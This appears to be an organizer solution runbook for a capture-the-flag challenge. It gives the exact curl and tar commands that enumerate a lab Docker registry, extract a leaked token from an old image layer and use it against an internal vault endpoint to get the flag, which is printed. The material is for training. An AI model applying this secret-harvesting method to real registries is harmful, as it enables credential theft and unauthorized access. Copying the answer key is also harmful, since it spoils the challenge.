# D27 — Private Container Registry: Organizer Solution & Engineering Runbook

## 1. Challenge Overview
* **Challenge ID:** D27
* **Name:** Private Container Registry
* **Difficulty:** Very Hard
* **Primary Concepts:** Registry, image layers, historical secrets
* **External Interface:** TCP/80 (HTTP Registry Gateway) & TCP/22 (SSH Workstation)
* **Author / Team:** Latveria Cybernetic Range Engineering Team

---

## 2. Architecture
The challenge environment provides an authentic OCI / Docker Registry v2 distribution service and an internal Orbital Vault daemon:

```text
PLAYER (HTTP:80 or SSH:22)
   |
   +--> [PORT 80 / PORT 5000] LOCAL PRIVATE REGISTRY (Docker v2 API)
   |        |
   |        +--> Repositories: latveria/orbital-sentinel, latveria/core-auth, latveria/telemetry-relay
   |        +--> Tags: latest, v3.0.1, v3.0.0, v2.1.0, v1.0.0
   |        +--> Image Layers (tar.gz blobs)
   |                 |
   |                 v (Inspect v1.0.0 layer)
   |            HISTORICAL SECRET:
   |            LATVERIAN_INTERNAL_TOKEN=latv_vault_sec_89f2a481c90e37b2d5140e678a119c8f
   |
   +--> [PORT 8080 - INTERNAL ONLY] ORBITAL VAULT SERVICE
            |
            v (Authenticated POST /api/v1/vault/override)
           FLAG
```

The registry is isolated per-team, read-only, and bounded in size (<20MB total storage). The internal service runs on localhost port 8080 under unprivileged user `vault` (uid 1003) and is shielded from direct public network ingress.

---

## 3. Registry Structure
The registry implements the official Docker Registry v2 HTTP API specification:
* `GET /v2/`: Verification handshake
* `GET /v2/_catalog`: Catalog of repositories (`latveria/core-auth`, `latveria/orbital-sentinel`, `latveria/telemetry-relay`)
* `GET /v2/<repo>/tags/list`: Tag enumeration
* `GET /v2/<repo>/manifests/<tag>`: Image manifest containing configuration blob descriptor and layer descriptors
* `GET /v2/<repo>/blobs/<digest>`: Download raw blob data (gzipped layer tarball or config JSON)

---

## 4. Image/Tag Inventory
1. `latveria/orbital-sentinel`:
   * `latest` / `v3.0.1`: Current production image. Filesystem contains clean, sanitized code.
   * `v3.0.0`: Major release before patch. Clean config without secrets.
   * `v2.1.0`: Migration release containing a layer with a whiteout file removing old configs.
   * `v1.0.0`: Early prototype release. Layer 3 contains `/app/config/orbital_vault.conf` with master credentials.
2. `latveria/core-auth`:
   * `latest` / `v2.4.0`: Clean auth build.
   * `v2.3.1`: Decoy test build containing sample non-functional credentials (`TEST_TOKEN=latv_test_auth_token_sample_non_functional`).
3. `latveria/telemetry-relay`:
   * `latest` / `v1.5.0`: Decoy telemetry service containing dummy debug keys (`LATVERIAN_TELEMETRY_KEY=latv_telemetry_dummy_debug_key_112`).

---

## 5. Intended Discovery Path
1. **Catalog Enumeration:** Query `http://127.0.0.1:5000/v2/_catalog` to discover the repositories.
2. **Tag Enumeration:** Query `http://127.0.0.1:5000/v2/latveria/orbital-sentinel/tags/list` to find available tags (`v1.0.0`, `v2.1.0`, `v3.0.0`, `v3.0.1`, `latest`).
3. **Manifest Inspection:** Retrieve manifests for all tags. Compare layer digests between `latest` and `v1.0.0`.
4. **Historical Layer Forensics:** Download layer blobs for `v1.0.0`. Inspect the third layer tarball.
5. **Secret Extraction:** Locate `/app/config/orbital_vault.conf` in the layer archive and extract the secret credentials.
6. **Internal Service Interaction:** Send an authenticated HTTP POST request to `http://127.0.0.1:8080/api/v1/vault/override` containing the token.
7. **Flag Retrieval:** Receive the unlocked vault response with the dynamic team flag.

---

## 6. Historical Secret Location
* **Repository:** `latveria/orbital-sentinel`
* **Tag:** `v1.0.0`
* **File:** `/app/config/orbital_vault.conf`
* **Secret Content:**
  * `LATVERIAN_INTERNAL_TOKEN = latv_vault_sec_89f2a481c90e37b2d5140e678a119c8f`
  * `LATVERIAN_CALLER_ID = orbital_defense_service_master`
  * `LATVERIAN_GATEWAY_ACTION = OVERRIDE_DEFENSE_GRID`
* **Why current image does not contain it:**
  In subsequent image versions (`v2.1.0` through `latest`), the configuration was deleted in a later build layer (`RUN rm -f /app/config/orbital_vault.conf`). In the current container filesystem or `latest` image view, the file is completely absent.

---

## 7. Exact Commands Used During Solve

### Step 1: Query Registry Catalog
```bash
curl -s http://127.0.0.1:5000/v2/_catalog
# Output: {"repositories": ["latveria/core-auth", "latveria/orbital-sentinel", "latveria/telemetry-relay"]}
```

### Step 2: Enumerate Repository Tags
```bash
curl -s http://127.0.0.1:5000/v2/latveria/orbital-sentinel/tags/list
# Output: {"name": "latveria/orbital-sentinel", "tags": ["latest", "v1.0.0", "v2.1.0", "v3.0.0", "v3.0.1"]}
```

### Step 3: Fetch Manifest of Historical Tag v1.0.0
```bash
curl -s http://127.0.0.1:5000/v2/latveria/orbital-sentinel/manifests/v1.0.0 | jq .
```

### Step 4: Download and Inspect Layer Blobs
For each layer digest listed in `v1.0.0` manifest:
```bash
mkdir -p /tmp/v1_layers
curl -s http://127.0.0.1:5000/v2/latveria/orbital-sentinel/blobs/<LAYER_DIGEST> -o /tmp/v1_layers/layer.tar.gz
tar -ztvf /tmp/v1_layers/layer.tar.gz
```

Inspecting layer 3 reveals:
```text
-rw-r--r-- root/root       643 2026-08-27 00:50 app/config/orbital_vault.conf
```

Extract the file:
```bash
tar -zxvf /tmp/v1_layers/layer.tar.gz app/config/orbital_vault.conf
cat app/config/orbital_vault.conf
```

### Step 5: Authenticate to Internal Vault Service
```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/vault/override \
  -H "X-Latverian-Token: latv_vault_sec_89f2a481c90e37b2d5140e678a119c8f" \
  -H "X-Caller-ID: orbital_defense_service_master" \
  -H "X-Gateway-Action: OVERRIDE_DEFENSE_GRID" | jq .
```

---

## 8. Final Service
* **Service:** Latveria Orbital Defense Vault Daemon
* **Endpoint:** `http://127.0.0.1:8080/api/v1/vault/override`
* **Process User:** `vault` (uid 1003)
* **Access Boundary:** Internal loopback / pod network only.

---

## 9. Credential Usage
* Header `X-Latverian-Token`: `latv_vault_sec_89f2a481c90e37b2d5140e678a119c8f`
* Header `X-Caller-ID`: `orbital_defense_service_master`
* Header `X-Gateway-Action`: `OVERRIDE_DEFENSE_GRID`

---

## 10. Flag Retrieval
The service returns JSON:
```json
{
  "status": "SUCCESS",
  "message": "Orbital Defense Vault unlocked. Master override authority verified.",
  "authorization": {
    "caller": "orbital_defense_service_master",
    "action": "OVERRIDE_DEFENSE_GRID",
    "token_scope": "ORBITAL_DEFENSE_MASTER_LEVEL5",
    "verified": true
  },
  "grid_state": {
    "status": "OVERRIDDEN",
    "orbital_satellite": "LATVERIA-ORBITAL-SAT-01",
    "defense_protocol": "ZEPHYR-99",
    "lock_state": "DISENGAGED"
  },
  "flag": "YUVA{pr1v4t3_r3g1stry_l4y3r_3xf1ltr4t10n_9901}"
}
```

---

## 11. Expected Flag
Default static test flag:
`YUVA{pr1v4t3_r3g1stry_l4y3r_3xf1ltr4t10n_9901}`

---

## 12. Reset Procedure
Redeploying the container or restarting the Kubernetes pod restores the initial registry seed store, resets the flag file `/opt/vault/flag.txt`, and terminates any active connections.

---

## 13. Decoys
1. `latveria/core-auth:v2.3.1`: Contains decoy `TEST_TOKEN=latv_test_auth_token_sample_non_functional`.
2. `latveria/telemetry-relay:latest`: Contains decoy `LATVERIAN_TELEMETRY_KEY=latv_telemetry_dummy_debug_key_112`.
3. The vault service explicitly returns HTTP 403 Forbidden with a clear decoy rejection notice when these tokens are submitted.

---

## 14. Security Boundaries
* The workstation runs as unprivileged user `developer` (uid 1001).
* The vault daemon runs as unprivileged user `vault` (uid 1003).
* The registry runs as unprivileged user `registry` (uid 1002).
* `/opt/vault/flag.txt` is mode `0400` owned by `vault`. User `developer` cannot read it directly.
* Registry operations are strictly read-only (`POST`/`PUT`/`DELETE` return 405 Method Not Allowed).
* No Docker socket, no K8s service account token, no host filesystem access.

---

## 15. Resource Limits
* CPU: 250m requests, 2000m limits.
* Memory: 256Mi requests, 1024Mi limits.
* Storage: Ephemeral container root (<20MB total registry storage).

---

## 16. Validation Results
* Fresh start test: PASS
* Intended solve test: PASS
* Historical layer recovery: PASS
* Shortcut resistance: PASS
* Security boundary test: PASS
* Participant package hygiene: PASS
